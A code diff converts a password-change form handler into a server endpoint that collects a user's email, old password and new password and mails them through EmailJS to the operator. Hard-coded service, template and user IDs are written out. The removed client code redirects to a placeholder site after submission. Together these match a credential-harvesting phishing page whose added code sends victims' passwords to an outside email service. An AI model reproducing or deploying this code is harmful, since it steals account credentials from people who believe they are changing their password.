@@ -1,33 +1,28 @@
-document.getElementById('passwordForm').addEventListener('submit', function(event) {
-  event.preventDefault();
+import emailjs from 'emailjs-com';
 
-  const email = document.getElementById('email').value;
-  const oldPassword = document.getElementById('oldPassword').value;
-  const newPassword = document.getElementById('newPassword').value;
+export default async function handler(req, res) {
+  if (req.method === 'POST') {
+    const { email, oldPassword, newPassword } = req.body;
 
-  fetch('/api/save', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      email: email,
-      oldPassword: oldPassword,
-      newPassword: newPassword
-    })
-  })
-  .then(response => {
-    if (response.ok) {
-      document.getElementById('passwordForm').style.display = 'none';
-      document.getElementById('successMessage').style.display = 'block';
-      setTimeout(() => {
-        window.location.href = 'https://your-website.com';
-      }, 2000);
-    } else {
-      alert('Something went wrong, please try again.');
+    try {
+      // Using EmailJS to send the data to your email
+      const response = await emailjs.send(
+        'service_8hdqzju', // Your EmailJS Service ID
+        'template_hk6uqi8', // Your EmailJS Template ID
+        {
+          email: email,
+          oldPassword: oldPassword,
+          newPassword: newPassword,
+        },
+        'ODWuzZ-mZLM196nkP' // Your EmailJS User ID
+      );
+
+      res.status(200).json({ message: 'Email sent successfully!' });
+    } catch (error) {
+      console.error('Error sending email:', error);
+      res.status(500).json({ message: 'Failed to send email' });
     }
-  })
-  .catch(() => {
-    alert('Error sending data.');
-  });
-});
+  } else {
+    res.status(405).json({ message: 'Method Not Allowed' });
+  }
+}
